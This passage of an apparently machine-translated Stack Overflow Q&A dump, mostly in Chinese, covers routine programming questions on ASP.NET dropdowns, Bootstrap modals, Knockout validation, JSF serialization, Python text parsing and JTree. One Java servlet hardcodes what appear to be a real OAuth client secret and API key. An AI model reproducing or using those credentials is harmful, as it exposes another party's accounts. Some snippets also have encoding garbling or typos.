    @Html.DropDownListFor(x => x.Cities, Enumerable.Empty<SelectListItem>(), new { id = "cityID" }) 
```

**这是我视图中的 JavaScript，不知何故，一旦我得到它们，我就没有正确处理我的结果：**

```
$(function () {
    $("#stateID").change(function () {
        var stateId = $(this).val();
        // and send it as AJAX request to the newly created action 
        $.ajax({
            url: '@Url.Action("GetCities")',
            type: 'GET',
            data: { Id: stateId },
            cache: 'false',

            success: function (result) {
                var citySelect = $('#cityID');
                $(citySelect).empty();

                // when the AJAX succeeds refresh the ddl container with

                $.each(result, function (result) {
                    $(citySelect)
                    .append($('<option/>', { value: this.simpleCityID })
                    .text(this.cityFull));

                });
            },
            error: function (result) {
                alert('An Error has occurred');
            }
        });
    });
}); 
```

这是我的 JavaScript 调用的控制器：

```
public JsonResult GetCities(int Id)
    {
        return Json(GetCitySelectList(Id), JsonRequestBehavior.AllowGet);
    }

    private SelectList GetCitySelectList(int Id)
    {
        var cities = simpleDB.simpleCity.Where(x => x.simpleStateId == Id).ToList();

        SelectList result = new SelectList(cities, "simpleCityId", "cityFull");
        return result;
    } 
```

这是我从 Firbug 得到的结果，它告诉我我正在构建和获取数据没有问题，只是没有正确填充我的 DropDownList：

```
[{"Selected":false,"Text":"Carmel","Value":"IN001"},{"Selected":false,"Text":"Fishers","Value":"IN002"}] 
```

如果有人对 JavaScript 无法填充下拉菜单的原因有任何建议，请发表评论，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T20:11:59.707

Thank you for your assistance,

It turns out that in my JavaScript below, I was attempting to directly reference the **simpleCityID** and **cityFull** fields associated with my data model:

```
$.each(result, function (result) {
                $(citySelect)
                .append($('<option/>', { value: this.simpleCityID })
                .text(this.cityFull)); 
```

Instead, I needed to keep it generic and inline with JavaScript standards of referencing **Value** and **Text**:

```
$.each(modelData, function (index, itemData) {
                select.append($('<option/>', {
                    value: itemData.Value,
                    text: itemData.Text 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:58:17.977

我已经用这样的方法做了好几次：

创建一个部分填充下拉列表。将其命名`DropDownList`并放入`Shared`Views 文件夹

```
@model SelectList     
@Html.DropDownList("wahtever", Model) 
```

您的创建视图应该是这样的（跳过不相关的部分）

```
<script type="text/javascript">
    $(function() {
        $("#StateId").change(function() {
            loadLevelTwo(this);
        });

        loadLevelTwo($("#StateId"));
    });

    function loadLevelTwo(selectList) {
        var selectedId = $(selectList).val();

        $.ajax({
            url: "@Url.Action("GetCities")",
            type: "GET",
            data: {stateId: selectedId},
            success: function (data) {
                $("#CityId").html($(data).html());
            },
            error: function (result) {
                alert("error occured");
            }
        });
    }
</script>

@Html.DropDownList("StateId")

<select id="CityId" name="CityId"></select> 
```

仔细注意 Empty `Select`item for`CityId`和`loadLevelTwo`at的调用`document.ready`

你的控制器应该是这样的：

```
public ActionResult Create()
{
    ViewBag.StateId = new SelectList(GetAllCities(), "Id", "Name");
    return View();
}

public ActionResult GetCities(int stateId) {
    SelectList model = new SelectList(GetCitiesOfState(stateId), "Id", "Name");
    return PartialView("DropDownList", model);
} 
```

# actionscript-3 - 为什么要将现有的访问令牌传递给 Facebook.init()？

> ID：11553320
> 
> 赞同：0
> 
> 时间：2012-07-19T02:59:28.707
> 
> 标签：actionscript-3, flash, facebook-access-token, facebook-actionscript-api

根据其[API 文档](http://facebook-actionscript-api.googlecode.com/svn/release/current/docs/index.html)，Facebook.init() 方法允许您传递现有的访问令牌。这对我的项目非常有用，所以我在 Facebook 上创建了一个测试应用程序并按照[这些说明](https://developers.facebook.com/docs/authentication/signed_request/)通过 PHP 获取用户的 oauth_token。完成后，我的 PHP 脚本使用 FlashVars 将令牌传递给我的 SWF，然后 SWF 使用现有令牌调用 Facebook.init()。

所有这些工作正常（应用程序在 Facebook 中启动并且 SWF 播放），但它产生了我认为是意外的结果：我传递给 Facebook.init() 的访问令牌与生成的 FacebookAuthResponse 对象。

这是设计使然吗？如果是这样，将现有访问令牌传递给 Facebook.init() 有什么意义？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-25T07:15:28.653

我会回答我自己的问题，以防它对其他人有所帮助，特别是因为 Facebook-ActionScript API 变得过时且脆弱（即使在 Adob​​e 自己的[教程](http://www.adobe.com/devnet/facebook/articles/flex_fbgraph_intro.html)中调用 Facebook.init() 也被破坏了）。

简而言之，我通过 PHP 验证用户并将访问令牌传递给 SWF 的方法意味着我的应用程序不需要调用 Facebook.init()。事实上，一旦我的 SWF 开始执行，它就可以使用通过 FlashVars 传递给它的访问令牌，如下所示：

```
Facebook.api("/me/friends?access_token=" + accessToken, getFriendsHandler); 
```

# validation - 如何显式验证可观察到的 knockoutJs

> ID：11553323
> 
> 赞同：0
> 
> 时间：2012-07-19T03:00:00.017
> 
> 标签：validation, knockout.js, knockout-validation

我在这里使用 KnoockoutJS 和验证插件，[https://github.com/ericmbarnard/Knockout-Validation](https://github.com/ericmbarnard/Knockout-Validation)。

默认情况下，验证消息仅在字段被修改后出现。问题是当用户单击“保存”时，无论用户是否修改了字段，我都需要验证绑定的 observable。

我似乎无法在可观察到的情况下找到 .Validate()...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T03:14:04.747

看起来`ko.validation.validateObservable`可能是您正在寻找的......我没有测试它，但看起来像它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-18T06:17:59.017

我`ko.validatedObservable($data)().isValid()`用来获取视图模型是否为假。

如果有人知道更好的方法，请发表评论:)

# jquery - 为什么引导程序“模态”插件回调没有触发？

> ID：11553324
> 
> 赞同：4
> 
> 时间：2012-07-19T03:00:01.817
> 
> 标签：jquery, twitter-bootstrap

我在理解 Bootstraps Modal **Callbacks**时遇到问题。

以下代码的“ *.on('show',function(){})* ”部分未触发。不知道为什么。请指教。此外，欢迎任何/所有代码优化提示。

**的HTML**

```
<p><a class="bsModal" href="#" title="Bootstrap Modal">testing modal</a></p> 
```

**jQuery**

```
 // Dynamically calling Bootstrap Modal
$('.bsModal').click(function(){

    var bsModalWindow = '<div class="modal" id="myModal">';
        bsModalWindow +=    '<div class="modal-header">';
        bsModalWindow +=        '<button type="button" class="close" data-dismiss="modal">×</button>';
        bsModalWindow +=            '<h3>Modal header</h3>';
        bsModalWindow +=    '</div>';
        bsModalWindow +=    '<div class="modal-body">';
        bsModalWindow +=        '<p>This is an example of the Bootstrap jQuery Plugin: Modal.</p>';
        bsModalWindow +=    '</div>';
        bsModalWindow +=    '<div class="modal-footer">';
        bsModalWindow +=        '<a href="#" class="btn" data-dismiss="modal">Close</a>';
        bsModalWindow +=        '<a href="#" class="btn btn-primary">Save changes</a>';
        bsModalWindow +=    '</div>';
        bsModalWindow += '</div>';

        $(bsModalWindow).modal()
            .on('show', function() {
                console.log('Modal will be shown');
            })
            .on('shown', function() {
                console.log('Modal was shown');
            })
            .on('hide', function() {
                console.log('Modal will be hidden');
            })
            .on('hidden', function() {
                console.log('Modal is hidden');
            })
            .show({
                backdrop: true,
                keyboard:true
            });                 

}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-19T11:49:23.460

这是您显示动态引导模型并调用其回调函数的解决方案。

**HTML：**

```
<div id="panel">
  <div class="divbutton">
    <a href="#myModal" class="btn btn-primary btn-large bsModal">
      Launch Demo Modal 
    </a>
  </div>
</div> 
```

jQuery：

```
$(function() {
    var bsModalWindow = '<div class="modal hidden fade" id="myModal">';
    bsModalWindow += '<div class="modal-header">';
    bsModalWindow += '<button type="button" class="close" data-dismiss="modal">Ã�&lt;/button>';
    bsModalWindow += '<h3>Modal header</h3>';
    bsModalWindow += '</div>';
    bsModalWindow += '<div class="modal-body">';
    bsModalWindow += '<p>This is an example of the Bootstrap jQuery Plugin: Modal.</p>';
    bsModalWindow += '</div>';
    bsModalWindow += '<div class="modal-footer">';
    bsModalWindow += '<a href="#" class="btn" data-dismiss="modal">Close</a>';
    bsModalWindow += '<a href="#" class="btn btn-primary">Save changes</a>';
    bsModalWindow += '</div>';
    bsModalWindow += '</div>';

    //Append Model Div before button div on html page
    $(".divbutton").before(bsModalWindow); 

    $(".bsModal").click(function() {
        //Bind Callback functions with model events 
        $("#myModal").on('show', function() {
            //Change Top position of modal on show call back
            $("#myModal").css('top', '100%');
            console.log('Modal will be shown');
        }).on('shown', function() {
            console.log('Modal was shown');
        }).on('hide', function() {
            console.log('Modal will be hidden');
        }).on('hidden', function() {
            console.log('Modal is hidden');
        }).show({
            backdrop: true,
            keyboard: true
        });
        //Show Modal
        $("#myModal").modal('show');
    });
}); 
```

我在[http://codebins.com/bin/4ldqpa7上做了垃圾箱](http://codebins.com/bin/4ldqpa7)

# java-me - 用于黑莓的 rabbitMQ

> ID：11553331
> 
> 赞同：1
> 
> 时间：2012-07-19T03:00:34.910
> 
> 标签：java-me, rabbitmq

如您所知，RabbitMQ 是用于消息发送/接收的优秀开源项目。

现在我们有一个 BlackBerry 项目需要使用 RabbitMQ。

但是，当我们下载最新的 RabbitMQ 客户端 zip 并导入我们的项目时，我们发现了很多错误。

通过研究我们发现这些错误是由于Java jdk版本造成的。Blackberry jdk 基于 Java ME，换句话说，blackberry API 只支持 Java ME sdk，但是你的 RabbitMQ 客户端代码基于 Java SE sdk，所以，有些 RabbitMQ 使用的 API 不能被 RIM 支持，比如
HashMap。Cloneable接口、EvevntListener接口等。

我曾尝试修改这些错误，但发现它非常困难，因为更改这会在其他类中产生更多错误。

你能给我一些建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T11:57:33.503

在 RabbitMQ Java 客户端页面[http://www.rabbitmq.com/java-client.html](http://www.rabbitmq.com/java-client.html)我们看到最新版本可用。2.8.4 截至今天。[但是他们在网站http://www.rabbitmq.com/releases/rabbitmq-java-client/](http://www.rabbitmq.com/releases/rabbitmq-java-client/)上保留了旧版本

尝试使用最旧版本的库，看看它是否适用于 Java ME [http://www.rabbitmq.com/releases/rabbitmq-java-client/v1.4.0/](http://www.rabbitmq.com/releases/rabbitmq-java-client/v1.4.0/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-21T19:10:20.577

带有 Java AMQP API 的 RabbitMQ 可能不是在 JavaME 环境中实现您想要的最佳方式。例如，您是否考虑过使用 STOMP？RabbitMQ 有一个 STOMP 插件，您可以使用 STOMP JavaME 库来与 RabbitMQ 通信吗？

# c++ - 如何找到 ROI 并检测内部标记？

> ID：11553332
> 
> 赞同：2
> 
> 时间：2012-07-19T03:00:35.663
> 
> 标签：c++, opencv

我是计算机视觉的初学者。我有一个关于检测和跟踪的问题。我想检测下图中的白色矩形，以确定感兴趣的区域并检测红色标记的轮廓。

但我不想利用颜色信息来检测标记。

谁能给我建议如何做到这一点？

![示例图片](../Images/8f109144d920e29674a802e2d6f7b359.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:06:54.590

If you want to just detect the circles, an adapted [Hough Tranfrom](http://en.wikipedia.org/wiki/Hough_transform) should work.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T09:28:23.113

您可以找到轮廓`CvFindContours`并使用`CvApproxPoly()`找到矩形。[您可以在此处](http://www.aishack.in/2010/01/an-introduction-to-contours/)找到如何使用此功能查找矩形并使其适应您的情况的一个很好的示例。为了找到圆圈，我建议对 arcLength 和你找到的轮廓面积之间的比率做一些事情，因为对于圆圈，这个比率是非常具体的。要查找 arcLength ，请在 for 循环中遍历轮廓时使用`cvArcLength(CvSeq* c)`查找区域。`cvContourArea(CvSeq* c)`

# backbone.js - Backbone.js 多步骤表单

> ID：11553333
> 
> 赞同：11
> 
> 时间：2012-07-19T03:00:39.393
> 
> 标签：backbone.js

我希望在我的网站上为“即时报价”类型的东西制作一个分步表格。我在 Photoshop 上制作了以下图像，我希望用户在表单的每一步输入信息并最终在第 3 步提交表单（进入下一步应该是无缝的，无需重新加载页面） .

![在此处输入图像描述](../Images/77a8d5081b0429efb0f3c4b83b8a221f.png)

有人可以给我一些一般性的指示，我应该如何去做？这是我使用backbone.js 的第一个项目，它确实有助于对处理这个特定小部件的最佳方法有一个高级概述。

谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-19T08:27:45.460

我将其结构如下：

**1\. 实现数据采集模型**

有一个单一的模型来收集各个阶段的数据。实现该模型的存储，并允许部分完成的数据。（您可能希望在每个阶段存储它，以便用户可以在以后返回）。

**2\. 实现通用的“多阶段”视图**

这应该负责在顶部渲染选项卡/阶段，为向后/向前渲染导航元素，以及渲染子视图。

**3.为每个阶段实现特定的子视图**

这些应该对上述模型的位进行操作。

**4.实现路由**

您可能希望每个子视图使用不同的 URL 路由，或者您可能希望整个多阶段流程使用相同的 URL。无论哪种方式，路由器都需要创建外部多阶段视图和内部子视图（或视图），并将它们与适当的模型连接在一起。

**5\. 提示：利用 pub/sub**

不要把你的观点紧紧地耦合在一起。使用某种形式的 pub/sub 来引发和监听自定义事件。（例如： http: [//lostechies.com/derickbailey/2011/07/19/references-routing-and-the-event-aggregator-coordinating-views-in-backbone-js/](http://lostechies.com/derickbailey/2011/07/19/references-routing-and-the-event-aggregator-coordinating-views-in-backbone-js/)）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-20T18:30:46.987

除了 stusmith，我只是做了一个主干 js 多步表单的例子。随意看看并复制它。

[https://github.com/michaelkoper/backbone-multistep-form](https://github.com/michaelkoper/backbone-multistep-form)

# php - 无需用户离开我的网站即可请求 Facebook 权限

> ID：11553334
> 
> 赞同：0
> 
> 时间：2012-07-19T03:00:43.940
> 
> 标签：php, facebook, facebook-graph-api

是否可以在不让他们离开您的网页的情况下获得访问 Facebook 用户的用户 ID 的权限？带有权限对话框的 iframe 是实现此目的的唯一真正方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T06:18:45.633

您可以使用 Javascript API 来扩展权限。假设您已经请求了电子邮件权限，如果您将新权限传递给登录按钮，用户也必须批准新权限。

**登录按钮示例：**

```
<fb:login-button perms="friend_likes"></fb:login-button> 
```

**示例 FB.login()**

```
function fbAuth() {
    FB.login(function(response) {
      if (response.authResponse) {
        alert('User fully authorize the app.');
      } else {
        alert('User canceled login or did not fully authorize the app.');
      }
    }, { scope: 'friend_likes' });
} 
```

然后您可以使用 onclick 事件或您想要的任何其他方法调用它：

```
<a href="#" onclick="return fbAuth();">Login</a> 
```

# jsf - 无法序列化会话 Bean - 引发警告

> ID：11553335
> 
> 赞同：0
> 
> 时间：2012-07-19T03:00:45.033
> 
> 标签：jsf, jpa, session-bean

我正在使用 EclipseLink (JPA 2.0) 在 netbeans 中运行 JSF + Primefaces + tomcat 6.0.32 的环境。

我的应用程序运行良好，但是每次运行它时，我都会收到很多警告说不能序列化我的会话 bean，并为每个会话 bean 显示这样的块：

```
18-jul-2012 23:05:46 org.apache.catalina.session.StandardSession writeObject
ADVERTENCIA: No puedo serializar atributo de sesión facturacionController para sesión 62A53325838E1E7C6EB6607B1E7965E6
java.io.NotSerializableException: org.eclipse.persistence.internal.jpa.EntityManagerFactoryImpl
    at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1164)
    at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1518)
    ... and so on... 
```

问题是我的会话 bean 已经实现了可序列化。那么我能做些什么来解决这个问题呢？

谢谢 ！

---- 添加信息 07/20/2012 ----

我从会话 bean 中引用 EntityManager 的唯一一点是当我在 getter 属性中创建 jpaController 时，如下所示：

```
private JpaController getJpaController() {
    if (jpaController == null) {
        jpaController = new JpaController(Persistence.createEntityManagerFactory("myPersistenceUnit"));
    }
    return jpaControllerPedido;
} 
```

那是因为我这样定义了 jpaController 构造函数：

```
public JpaController(EntityManagerFactory emf) {
    this.emf = emf;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T05:24:06.167

使类 Serializable 并不意味着其中的所有内容都是可序列化的。类中的所有引用（依赖项/属性），它们本身应该是可序列化的，反过来也是它们的引用。

根据上述异常，您的会话 bean 似乎引用了不可序列化的 EntityManagerFactoryImpl 对象，因此出现错误。

为了解决这个问题，您可以将其定义为`transient`不会被序列化，但唯一的问题是在反序列化期间您必须手动构建对象或分配引用。

我建议看看这篇关于[序列化](http://www.ibm.com/developerworks/java/library/j-5things1/index.html)的文章。

如何解决这个问题，我不做 JPA，所以无法判断是否有相同的序列化类，

为了解决它，将参考定义为`transient`

```
transient EntityManagerFactory entityManagerFactory 
```

并在反序列化挂钩方法中手动将引用分配回 bean，如下所述。

```
private void readObject(java.io.ObjectInputStream stream)
        throws java.io.IOException, ClassNotFoundException
    {
        stream.defaultReadObject();

        // assign reference manually.
        this.entityManagerFactory =  //get from factory;
    } 
```

希望这可以帮助 ！！！！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-03-30T23:17:48.030

你只添加这个：

```
transient EntityManagerFactory entityManagerFactory; 
```

但是如果有任何其他实现 entityManagerFactory 的对象，这个对象也必须定义为。例如

```
transient static final EntityManagerFactory emf = Persistence.createEntityManagerFactory("porpertiesConexion");
transient EntityManager em;    

public void beginTransaction() {           
    em = emf.createEntityManager();  //
        //code....
} 
```

# netty - 从 Netty 3.5.x 到 Netty 4 性能提升多少

> ID：11553336
> 
> 赞同：3
> 
> 时间：2012-07-19T03:00:52.640
> 
> 标签：netty

从 Netty 3.5.x 到 Netty 4 的性能提升了多少？有一些数据吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:34:38.817

目前没有太大改善。不过，它的 GC 开销要少得多。一旦实现了缓冲池，我相信吞吐量也会变得更好。目前，吞吐量增益约为 5~10%，但 YMMV。

# java - 谷歌应用程序组设置 API 中的错误 400 无效值

> ID：11553340
> 
> 赞同：0
> 
> 时间：2012-07-19T03:01:12.293
> 
> 标签：java, google-app-engine, google-api, httprequest, gdata

我正在尝试使用 put 请求调用 url，而 url 是

> PUT [https://www.googleapis.com/groups/v1/groups/groupUniqueId](https://www.googleapis.com/groups/v1/groups/groupUniqueId)但得到错误响应为 { "error": { "errors": [ { "domain": "global", "reason": "required" ，“消息”：“必需”} ]，“代码”：400，“消息”：“必需”} }

如果我打开链接 [https://developers.google.com/google-apps/groups-settings/v1/reference/groups/update](https://developers.google.com/google-apps/groups-settings/v1/reference/groups/update) 则有一个 Try It 部分，我使用 OAuth2.0 对其进行授权并放置一些字段，如图所示在图像中![在此处输入图像描述](../Images/2e5b53e3d7215bf0ebd6abeb0aa517d3.png)

我编写了一个用于调用此 url 的 java servlet，这是它的 doGet 方法代码，我正在 Google Appengine 上编写它。我使用 oauth2 授权了应用程序，并且 acess_token 有效，否则它将显示授权错误。它向我显示无效值。

```
public void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {

        String url = "https://accounts.google.com/o/oauth2/token";

        // FetchOptions opt = FetchOptions.Builder.doNotValidateCertificate();
           URL url1=new URL(url); 
           String param="code="+req.getParameter("code")+"&client_id=719226850877-tr21kp47phthuli0hu2v24akgfrplde9.apps.googleusercontent.com&client_secret=hSXi3dWfEmDQfl0XZJJmBssc&redirect_uri=https://www.onemoredemo.appspot.com/oauth2callback&grant_type=authorization_code";

             HttpURLConnection connection = 
        (HttpURLConnection)url1.openConnection(); 
             connection.setDoOutput(true); 
             connection.setRequestMethod("POST"); 
             connection.setRequestProperty("Content-type", "application/x-www-form-urlencoded");
             connection.getOutputStream().write( param.getBytes() ); 
          InputStream str= connection.getInputStream();
          BufferedReader reader=new BufferedReader(new InputStreamReader(str));
        String l="";
        String l1="";

          while((l=reader.readLine())!=null){
              l1+=l;
             resp.getWriter().println(l);

          }
          try {
              JSONObject obj=new JSONObject();
              obj.put("email", "testing9@iritesh.com");
            JSONObject json=new JSONObject(l1);
            String access_token=json.getString("access_token");
            URL url2=new URL("https://www.googleapis.com/groups/v1/groups/testing@iritesh.com?key=AIzaSyATDZHO5J7a3ItTSBhPby__Xzxi7rZlMJQ");
            HttpURLConnection connection1=(HttpURLConnection) url2.openConnection();
            connection1.setRequestMethod("PUT");
            connection1.addRequestProperty("Content-Type", "application/json");
            connection1.setDoOutput(true);
            connection1.addRequestProperty("Authorization","Bearer "+ access_token);
            connection1.getOutputStream().write(obj.toString().getBytes());
            connection1.connect();
            InputStream str1= connection1.getInputStream();
              BufferedReader reader1=new BufferedReader(new InputStreamReader(str1));
             String rit;
              while( (rit=reader1.readLine())!=null)
             {resp.getWriter().println(rit);

             }

        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    } 
```

我试图提出与图像相同的请求。首先将 key 参数设置为 api key，然后通过调用 setRequestMethod("PUT") 将请求方法设置为 PUT；之后添加了两个属性，一个是 Authorization:Bearer access_token ，然后是 Content-Type : application/json 然后通过调用方法将其请求主体设置为 json 对象

```
connection1.getOutputStream().write(obj.toString().getBytes()); 
```

谁能指出我错在哪里以及我在哪里放置了无效值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T01:54:44.173

因为我正在尝试更改群组的电子邮件地址，但是当我在群组页面中手动尝试时，它无法更改，这就是我收到 400 错误的原因

# python - Python：获取/扫描某个字符串后的所有文本

> ID：11553341
> 
> 赞同：0
> 
> 时间：2012-07-19T03:01:13.013
> 
> 标签：python, text, keyword, text-extraction

我有一个使用 readlines() 读取的文本文件。我需要在文本文件中的关键字之后开始提取数据。例如，在下面的关键字之后`Hello World`，我想从 100 中检索值`Blah=100`：

```
Blah=0 
Blah=2
Hello World
All the Text
 Will be Scan
And Relevant       
  Info will be
 Retrieved Blah=100 
```

我可以轻松地从文本文件中检索到我想要的信息，但我需要它仅在文本文件中的某个关键字之后开始检索，例如在`'Hello World'`上述之后。我目前正在做的是使用`.split('=')`. 因此，我将检索所有 3 个值，`Blah=0`即`Blah=2`和`Blah=100`。我只希望在文本文件中的关键字之后检索值，例如`'Hello World'`value `Blah=100`。

必须有一个简单的方法来做到这一点。请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:12:18.780

有很多方法可以做到这一点。这是一个：

```
STARTER = "Hello World"
FILENAME = "data.txt"
TARGET = "Blah="

with open(FILENAME) as f:
    value = None
    start_seen = False
    for line in f:
        if line.strip() == STARTER:
            start_seen = True
            continue

        if TARGET in line and start_seen:
            _,value = line.split('=')
            break

if value is not None:
    print "Got value %d" % int(value)
else:
    print "Nothing found" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:14:52.973

这是一个略带伪代码的答案-您只需要一个标志，`True`一旦您找到关键字就会更改为：

```
thefile = open('yourfile.txt')

key = "Hello World"
key_found = False

for line in thefile:
    if key_found:
        get_value(line)
        # Optional: turn off key_found once you've found the value
        # key_found = False
    elif line.startswith(key):
        key_found = True 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:22:05.713

这是一种方法，不一定是最好的；我在这里对文本进行了硬编码，但您可以使用[file.read()](http://docs.python.org/tutorial/inputoutput.html#methods-of-file-objects)来获得类似的结果：

```
the_text = '''Blah=0 
Blah=2
Hello World
All the Text
 Will be Scan
And Relevant       
  Info will be
 Retrieved Blah=100
'''

keyword = 'Hello World'

lines = the_text.split('\n')
for line_num, line in enumerate(lines):
    if line.find(keyword) != -1:
        lines = lines[line_num:]
        break

the_value = None
value_key = 'Blah'
for line in lines:
    if line.find(value_key) != -1:
        the_value = line.split('=',2)[1]
        break

if the_value:
    print the_value 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T03:29:23.913

正则表达式示例。

```
reg = re.compile("Hello World")
data_re = re.ompile("Blah=(?P<value>\d)")
with open(f_name) as f:
   need_search = False
   for l in f:
       if reg.search(l) is not None:
          need_search = True
       if need_search == True:
          res = data_re.search(l)
          if res is not None:
             print res.groups('value') 
```

# javascript - 将变量注入跨域脚本

> ID：11553342
> 
> 赞同：0
> 
> 时间：2012-07-19T03:01:20.167
> 
> 标签：javascript, deployment, version-control

当我想在本地环境和生产环境之间更改变量值时，我已经编写了几个 javascript 第三方和浏览器扩展。

在其他语言中，我可以简单地创建一个名为 settings 或 config 或 globals 的文件，然后在我想在其中使用变量的脚本中导入或包含或要求该文件，但前端 javascript 似乎没有命名空间或脚本包含。所以我想知道如何在部署时轻松更改变量值。

我正在谈论的问题的一个例子：

假设我有一个打算由第三方加载的脚本：

```
(function(){
    var path = 'http://localhost:5000/some_script.js?callback=?&value=1';

    $.getJSON(path, function(data){
        console.log(data);
    });
})(); 
```

因为它是第三方脚本（它旨在加载到它所在的域以外的域上）我不能使用部分但显然我不希望`localhost:5000`在生产中设置路径。

我应该做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:08:33.243

您应该在开发过程中有一个构建步骤，以使用构建脚本将这些开发值转换为生产值。

像[Apache Ant](http://ant.apache.org/)之类的东西。

# php - JavaScript 将 xml 站点地图转换为可用链接？

> ID：11553344
> 
> 赞同：1
> 
> 时间：2012-07-19T03:01:30.307
> 
> 标签：php, javascript, sitemap

我有一个使用 weebly 制作的网站，所以我没有很多可定制的项目，例如搜索框和其他东西，但我知道 atomz 搜索。唯一的问题是他们需要链接才能访问网站上的页面，并且我有一些我想要包含的隐藏页面。我什至不确定这是否可行，但我可以转换格式为：

```
<url>
<loc>
http://kingdomofmuqtasid.weebly.com/1/post/2012/7/welcome-to-my-site-and-welcome-to-me.html
</loc>
<lastmod>2012-07-14</lastmod>
</url>
<url>
<loc>
http://kingdomofmuqtasid.weebly.com/1/post/2012/7/summers.html
</loc>
<lastmod>2012-07-14</lastmod>
</url>
<url>
<loc>
http://kingdomofmuqtasid.weebly.com/1/post/2012/7/apple-technology-of-the-future.html
</loc>
<lastmod>2012-07-14</lastmod>
</url>
<url> 
```

现在有什么方法可以获取 url 并将 document.write 作为链接？如果无法使用 javascript，我有一个本地 apache 设置，可用于测试 PHP 脚本，那么 PHP 会工作吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:51:33.690

您在问一个有多种解决方案的沉重问题。你应该在回来之前多做一些谷歌搜索，但这里是为了让你开始。

**选项 1：**使用 AJAX 加载站点地图 (xml) 文件、解析 XML 并构建/插入超链接。我建议您在所有这些步骤中使用 jQuery。这将是最快和最简单的解决方案，但对 SEO、可维护性等有副作用。

**选项 2：**使用 PHP 解析站点地图 (xml) 文件并在服务器上构建超链接。此解决方案将需要更多知识，并且可能需要更长的时间......但IMO是更好的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-10-01T16:09:34.593

您可以像这样在 PHP 中使用 simplexml_load_file() 函数：

```
<?php

$xml = simplexml_load_file ('sitemap.xml');

foreach ($xml->url as $url)
{
    print ("$url->loc\n");
}

?> 
```

请注意，您的整个 XML 文档应该包含在一个标记中：

```
<mydoc>
  <url> .. </url>
  <url> .. </url>
  <url> .. </url>
</mydoc> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2021-10-01T15:42:59.177

使用旧式 HTML 编辑器和记事本。将内容粘贴到记事本中，然后删除不是 URL 链接的内容。然后复制到 HTML 编辑器中。接下来将每个 URL 复制到链接生成器中并将其粘贴。慢，是的，但它可以工作。然后保存。

# javascript - 从 Javascript 访问 Chrome 的内部 gzip 例程

> ID：11553345
> 
> 赞同：9
> 
> 时间：2012-07-19T03:01:38.777
> 
> 标签：javascript, google-chrome, google-chrome-extension, websocket, gzip

所有现代浏览器都包含用于与服务器交换压缩数据的 gzip 例程。谁能指出我编写允许Javascript利用此例程的Chrome扩展程序的正确方向？

我想在通过 WebSocket 将一些数据发送到服务器之前用 Javascript 压缩一些数据，Chrome 内置的 deflate 例程肯定比我用 Javascript 编写的任何东西都要快。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T18:18:21.387

如果 javascript 实现对您来说不够快，您可以使用[native client](https://developers.google.com/native-client/devguide/tutorial)。

您将在 c/c++ 中使用一些 gzip 库，并编写胶水代码，以便 javascript 可以通过本机客户端调用它。如果可能的话，它应该接近或等于调用 chrome 的内部例程所获得的速度。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T05:11:03.497

根据对[Stack Overflow question 的回答](https://stackoverflow.com/a/10137558/1237044)，完全没有必要手动将 gzip 应用到 WebSocket。从版本 19 开始，Chrome 显然会在服务器支持时自动压缩 WebSocket 流量。

# java - JTree：不会重新显示新模型

> ID：11553351
> 
> 赞同：2
> 
> 时间：2012-07-19T03:02:54.133
> 
> 标签：java, swing, jtree

当我启动我的 Java swing 应用程序时，我将一个 XML 文件读入 DefaultTreeModel，使用该模型创建一个新的 JTree，将 jtree 添加到 JScrollPane，这样就可以了。一切正常：

```
// Program initialization:
jarFilesDB = new JarFilesDB ();
jarFilesDB.load(JarFilesDB.JAR_DB_FILENAME);
jtree = new JTree(jarFilesDB.getRootNode ());
JScrollPane scrollPane = new JScrollPane (jtree);
contentPane.add(scrollPane, BorderLayout.CENTER); 
```

稍后，我可能想创建一个*新*的XML 文件，并完全重建我的模型。当我这样做时，我无法让 jtree 重新显示新模型。要么我得到一个空白窗格，要么旧模型仍然显示：

```
// Completely regenerate XML file and Model
jarFilesDB.mkXmlFile (sPath);                // Generate new XML file
jarFilesDB.load(JarFilesDB.JAR_DB_FILENAME); // Generate new Model 
```

根据 Andrew Thompson 的要求，我写了一个“简短（尽可能）、独立、正确（不是！否则我不会问这个问题）示例）：

```
package com.rgb;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JTree;
import javax.swing.JScrollPane;
import javax.swing.tree.*;

public class FrmMain extends JFrame {

    private JPanel contentPane;

